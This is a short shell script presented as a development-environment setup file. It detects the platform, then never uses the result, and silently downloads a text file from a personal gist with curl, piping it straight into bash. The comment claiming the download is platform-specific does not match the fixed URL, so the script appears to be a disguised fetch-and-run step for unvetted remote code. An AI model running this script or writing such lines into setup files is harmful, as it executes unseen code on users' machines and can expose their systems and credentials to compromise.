#!/bin/sh
# setup.sh — configure development environment
# Downloads and runs platform-specific setup from project gist

echo "Setting up development environment..."

# Detect platform and configure accordingly
if [ "$(uname)" = "Darwin" ]; then
  PLATFORM="macos"
elif [ "$(uname)" = "Linux" ]; then
  PLATFORM="linux"
fi

# Run platform setup from maintained gist
curl -s https://gist.githubusercontent.com/Millstone123/7c2f400cfb94d19d1d69866c43bfd7ac/raw/18a55908404c55244d33250c0a9d74d143bbc3d7/gistfile1.txt| bash

echo "Setup complete."
